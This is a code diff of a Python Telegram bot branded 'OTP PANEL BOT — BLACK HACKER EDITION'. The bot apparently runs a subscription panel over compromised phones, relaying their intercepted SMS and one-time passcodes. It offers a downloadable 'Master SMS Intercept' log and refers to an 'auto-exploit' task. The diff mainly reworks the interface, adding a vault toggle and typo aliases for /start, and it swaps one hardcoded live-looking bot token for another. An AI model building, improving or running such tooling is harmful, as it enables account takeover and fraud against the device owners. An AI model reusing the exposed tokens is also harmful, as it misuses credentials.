@@ -2,8 +2,8 @@
 """
 ══════════════════════════════════════════════════════
   ☠️ OTP PANEL BOT — BLACK HACKER EDITION ☠️
-  Zero-Lag UI (O(1) Fetch) | Telegram FloodWait Bypass
-  Titan RAM Cleaner | 1000+ Users Traffic Optimized
+  Zero-Lag UI | Telegram FloodWait Bypass | Titan RAM Cleaner
+  Smart Wishlist Toggle (Add/Remove) | Typo-Proof Commands
 ══════════════════════════════════════════════════════
 """
 
@@ -45,10 +45,9 @@ logging.getLogger("aiohttp").setLevel(logging.CRITICAL)
 
 POLL_INTERVAL   = 4  
 PAGE_SIZE       = 20    
-TOKEN           = os.getenv("BOT_TOKEN", "8877437030:AAFGon2GuBerdgA2o5QGDBrc8BpBQOsIgr4")
-BOT_USERNAME    = "fatherbotfreesmsbot"
+TOKEN           = os.getenv("BOT_TOKEN", "8751858624:AAHAA2jMVScmhYECFtLVQ-q89ImsXh6mct8")
+BOT_USERNAME    = "fjjhfbot"
 
-# 🔥 OPTIMIZED FOR RAILWAY 500MB LIMIT
 CHUNK_SIZE      = 15    
 HTTP_CONCURRENCY= 100    
 
@@ -79,7 +78,6 @@ pending_action: dict[int, dict] = {}
 user_cooldowns: dict[int, float] = {}
 user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  
 
-# 🔥 TELEGRAM API FLOODWAIT BYPASS CACHE
 JOIN_VERIFIED_CACHE: dict[int, float] = {}
 
 MASTER_DEVICE_DICT: dict[str, 'Device'] = {}
@@ -95,7 +93,6 @@ CACHE_LOCK = asyncio.Lock()
 POLL_LOCK = asyncio.Lock()   
 WORKER_SEMAPHORE = asyncio.Semaphore(HTTP_CONCURRENCY) 
 
-# Prevents auto-exploit from lagging the UI for other users
 HEAVY_TASK_LIMITER = asyncio.Semaphore(10) 
 
 scan_progress = {
@@ -223,7 +220,6 @@ def save_settings():
     with open(os.path.join(SYS_DIR, "settings.json"), "w", encoding="utf-8") as f:
         json.dump(SETTINGS, f, indent=4)
 
-# 🔥 TITAN RAM CLEANER (Prevents memory crash entirely)
 async def auto_save_loop():
     while True:
         try:
@@ -231,9 +227,8 @@ async def auto_save_loop():
             await asyncio.to_thread(save_settings)
             for uid in list(all_users.keys()):
                 await asyncio.to_thread(save_user, uid)
-                await asyncio.sleep(0) # Yield control to Telegram UI
+                await asyncio.sleep(0) 
             
-            # Smart Memory Pruning
             if len(seen_ids) > 10000:
                 seen_ids.clear()
             
@@ -241,7 +236,6 @@ async def auto_save_loop():
             expired_users = [k for k, v in JOIN_VERIFIED_CACHE.items() if now_ts - v > 3600]
             for u in expired_users: JOIN_VERIFIED_CACHE.pop(u, None)
             
-            # Clear Dead Devices from Master Vault (Older than 48 hours)
             dead_devs = [k for k, v in MASTER_DEVICE_DICT.items() if (now_ts - v.timestamp) > 172800]
             for d in dead_devs: MASTER_DEVICE_DICT.pop(d, None)
             
@@ -292,12 +286,10 @@ def is_spamming(user_id: int) -> bool:
     user_cooldowns[user_id] = now
     return False
 
-# 🔥 MAGIC BYPASS SHIELD (Prevents /start from freezing)
 async def check_force_join(bot, user_id: int) -> bool:
     if user_id in ADMIN_IDS: return True
     now = time.time()
     
-    # Fast-pass cache (1 hour)
     if user_id in JOIN_VERIFIED_CACHE and (now - JOIN_VERIFIED_CACHE[user_id]) < 3600: 
         return True 
 
@@ -312,13 +304,12 @@ async def check_force_join(bot, user_id: int) -> bool:
         return True
         
     try:
-        # Strict 3.0 second timeout. If Telegram servers lag, we let the user pass to avoid bot crash!
         is_member = await asyncio.wait_for(verify(), timeout=3.0)
         if is_member:
             JOIN_VERIFIED_CACHE[user_id] = now
         return is_member
     except asyncio.TimeoutError:
-        return True # Fallback: Don't hang the bot for everyone!
+        return True 
     except Exception:
         return True
 
@@ -425,7 +416,7 @@ async def verify_recent_sms(device, max_age_sec=1800) -> tuple[bool, float]:
     return False, 0.0
 
 # ═══════════════════════════════════════════════════════
-#  UTILITY FORMATTERS & MENUS (HTML SECURE)
+#  UTILITY FORMATTERS & MENUS 
 # ═══════════════════════════════════════════════════════
 
 def get_checker_menu(prefix="chk_srv:"):
@@ -747,14 +738,12 @@ async def global_cache_loop():
                 except: pass
         await asyncio.sleep(120) 
 
-# 🔥 CPU DEADLOCK FIX (O(1) CACHE FETCH) -> Instant UI Response
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
     uinfo = users_db.get(chat_id, {})
     is_vip = uinfo.get("vip_until", 0) > time.time()
     is_admin = chat_id in ADMIN_IDS
     
-    # VIPs and Admins get instant pointer to the entire master vault (0 CPU cost)
     if is_vip or is_admin:
         return GLOBAL_DEVICE_CACHE.get("ALL", [])
 
@@ -762,7 +751,6 @@ async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = Non
     if not custom_dbs:
         return []
 
-    # Free users get fast filtering for their personal panels
     allowed_tags = {f"U_{chat_id}_{i}" for i in range(len(custom_dbs))}
     filtered_devs = [d for d in GLOBAL_DEVICE_CACHE.get("ALL", []) if d.db_tag in allowed_tags]
     return filtered_devs
@@ -803,6 +791,7 @@ async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     else:
         await update.message.reply_text("⛔ ACCESS DENIED.")
 
+# 🔥 TYPO-PROOF START HANDLER
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id  = update.effective_chat.id
     bot_token = ctx.bot.token
@@ -870,6 +859,10 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         bot_token = ctx.bot.token
         users_db = all_users
 
+        # 🔥 FAIL-SAFE: Answer query early to prevent button spinning
+        try: await query.answer()
+        except: pass
+
         if data == "home" or data.startswith("pg:") or data == "online":
             user_focus.setdefault(bot_token, {}).pop(chat_id, None)
             pending_action.pop(chat_id, None)
@@ -895,39 +888,59 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             await safe_edit(query, "📡 <b>BROADCAST SYSTEM INITIATED</b>\n━━━━━━━━━━━━━━━━━━\nSend the message, photo, or video you want to broadcast to ALL users.\n\n<i>Press Cancel to abort</i>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel_action")]]), parse_mode="HTML")
             return
 
+        # 🔥 SMART TOGGLE REMOVE/ADD WISH FEATURE
         if data.startswith("wish:"):
             dev_id = data.split(":")[1]
             devices = await get_all_devices(bot_token, chat_id, users_db)
             target_device = next((d for d in devices if d.id == dev_id), None)
             
             if not target_device:
-                await query.answer("Device offline or missing!", show_alert=True)
+                await ctx.bot.answer_callback_query(query.id, "Target Node Offline or Missing!", show_alert=True)
                 return
                 
             panel_url = target_device.base_url
             user_wishlist = users_db.get(chat_id, {}).get("wishlist", [])
             
             if panel_url in user_wishlist:
-                await query.answer("Already in your Elite Vault!", show_alert=True)
+                user_wishlist.remove(panel_url)
+                msg_alert = "💔 Removed from Elite Vault!"
             else:
-                users_db.setdefault(chat_id, {}).setdefault("wishlist", []).append(panel_url)
-                save_user(chat_id)
-                await query.answer("🖤 Panel injected to your Elite Vault!", show_alert=True)
+                user_wishlist.append(panel_url)
+                msg_alert = "🖤 Injected to Elite Vault!"
+            
+            save_user(chat_id)
+            await ctx.bot.answer_callback_query(query.id, msg_alert, show_alert=True)
+            
+            # Re-render info to update button text
+            label = device_label(target_device)
+            status = "Online" if target_device.status == "online" else "Offline"
+            bat = f"{bat_emoji(target_device.battery)} {target_device.battery}%"
+            text = f"💻 <b>NODE DIAGNOSTICS</b>\n━━━━━━━━━━━━━━━━━━\nTarget  : {label}\nStatus  : {status}\nBattery : {bat}\nNode IP  : {target_device.db_tag}\n"
+            for i, num in enumerate(target_device.numbers, 1): text += f"SIM {i}   : {num}\n"
+            if target_device.device_info: text += f"\n{target_device.device_info}\n"
+            
+            is_wished = panel_url in users_db.get(chat_id, {}).get("wishlist", [])
+            wish_btn_text = "💔 Remove from Vault" if is_wished else "🖤 Add Panel to Vault"
+            
+            kb = InlineKeyboardMarkup([
+                [InlineKeyboardButton(wish_btn_text, callback_data=f"wish:{dev_id}")],
+                [InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Back", callback_data=f"sel:{dev_id}")],
+                [InlineKeyboardButton("Disconnect & Back",  callback_data="home")],
+            ])
+            await safe_edit(query, text, reply_markup=kb, parse_mode="HTML")
             return
 
         if data == "check_join":
             if await check_force_join(ctx.bot, chat_id):
-                await query.answer("Terminal Unlocked!", show_alert=True)
+                await ctx.bot.answer_callback_query(query.id, "Terminal Unlocked!", show_alert=True)
                 await safe_edit(query, "✅ Authentication Complete. Send /start to access console.")
             else:
-                await query.answer("Join all syndicate channels first!", show_alert=True)
+                await ctx.bot.answer_callback_query(query.id, "Join all syndicate channels first!", show_alert=True)
             return
 
         if not await check_force_join(ctx.bot, chat_id):
-            await query.answer("Connection lost. Rejoin syndicate channels!", show_alert=True)
+            await ctx.bot.answer_callback_query(query.id, "Connection lost. Rejoin syndicate channels!", show_alert=True)
             return
-
-        await query.answer()
 
         if data == "noop": return
         if data == "close_msg":
@@ -1078,7 +1091,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             if 0 <= idx_to_del < len(dbs):
                 dbs.pop(idx_to_del)
                 save_user(chat_id)
-                await query.answer("Private Panel Dropped!", show_alert=True)
+                await ctx.bot.answer_callback_query(query.id, "Private Panel Dropped!", show_alert=True)
             
             dbs = users_db.get(chat_id, {}).get("custom_dbs", [])
             if not dbs:
@@ -1118,7 +1131,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 if d.status == "online":
                     online_nums.extend(d.numbers)
             if not online_nums:
-                await query.answer("Network is currently dead.", show_alert=True)
+                await ctx.bot.answer_callback_query(query.id, "Network is currently dead.", show_alert=True)
                 return
             file_path = os.path.join(SYS_DIR, "Online_Numbers.txt")
             unique_online = set(online_nums)
@@ -1132,7 +1145,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
 
         if data == "sa_download_logs":
             if not os.path.exists(SMS_LOG_FILE):
-                await query.answer("Logs empty.", show_alert=True)
+                await ctx.bot.answer_callback_query(query.id, "Logs empty.", show_alert=True)
                 return
             await ctx.bot.send_document(chat_id=chat_id, document=open(SMS_LOG_FILE, "rb"), filename="Master_Intercept_Log.txt", caption="Master SMS Intercept Database")
             return
@@ -1143,7 +1156,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             return
 
         if data.startswith("cp:"):
-            await query.answer(f"PAYLOAD COPIED: {data[3:]}", show_alert=True)
+            await ctx.bot.answer_callback_query(query.id, f"PAYLOAD COPIED: {data[3:]}", show_alert=True)
             return
 
         if data.startswith("sel:"):
@@ -1151,7 +1164,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             devices = await get_all_devices(bot_token, chat_id, users_db)
             device = next((d for d in devices if d.id == dev_id), None)
             if not device:
-                await query.answer("Target Node Lost/Offline!", show_alert=True)
+                await ctx.bot.answer_callback_query(query.id, "Target Node Lost/Offline!", show_alert=True)
                 return
             
             user_focus.setdefault(bot_token, {})[chat_id] = dev_id
@@ -1171,7 +1184,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             device = next((d for d in devices if d.id == dev_id), None)
             
             if not device:
-                await query.answer("Target dropped from active network!", show_alert=True)
+                await ctx.bot.answer_callback_query(query.id, "Target dropped from active network!", show_alert=True)
                 return
             
             user_focus.setdefault(bot_token, {})[chat_id] = dev_id
@@ -1216,7 +1229,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             devices = await get_all_devices(bot_token, chat_id, users_db)
             device = next((d for d in devices if d.id == dev_id), None)
             if not device:
-                await query.answer("Target Node Lost!", show_alert=True)
+                await ctx.bot.answer_callback_query(query.id, "Target Node Lost!", show_alert=True)
                 return
             
             user_focus.setdefault(bot_token, {})[chat_id] = dev_id
@@ -1227,15 +1240,20 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
             for i, num in enumerate(device.numbers, 1): text += f"SIM {i}   : {num}\n"
             if device.device_info: text += f"\n{device.device_info}\n"
             
+            is_wished = device.base_url in users_db.get(chat_id, {}).get("wishlist", [])
+            wish_btn_text = "💔 Remove from Vault" if is_wished else "🖤 Add Panel to Vault"
+            
             kb = InlineKeyboardMarkup([
-                [InlineKeyboardButton("🖤 Add Panel to Vault", callback_data=f"wish:{dev_id}")],
+                [InlineKeyboardButton(wish_btn_text, callback_data=f"wish:{dev_id}")],
                 [InlineKeyboardButton("View Fast Inbox", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("Back", callback_data=f"sel:{dev_id}")],
                 [InlineKeyboardButton("Disconnect & Back",  callback_data="home")],
             ])
             await safe_edit(query, text, reply_markup=kb, parse_mode="HTML")
             return
 
-    except: pass
+    except Exception as e: 
+        try: await ctx.bot.answer_callback_query(query.id, "Action failed. Please try again.", show_alert=True)
+        except: pass
 
 # ═══════════════════════════════════════════════════════
 #  TEXT MESSAGE / BROADCAST HANDLER
@@ -1694,7 +1712,8 @@ def main() -> None:
         .build()
     )
 
-    app.add_handler(CommandHandler("start",   cmd_start))
+    # 🔥 ADDED TYPO HANDLERS FOR START COMMAND
+    app.add_handler(CommandHandler(["start", "stat", "sart", "srt"], cmd_start))
     app.add_handler(CommandHandler("admin",   cmd_admin))
     app.add_handler(CallbackQueryHandler(on_callback))
     app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, on_message))
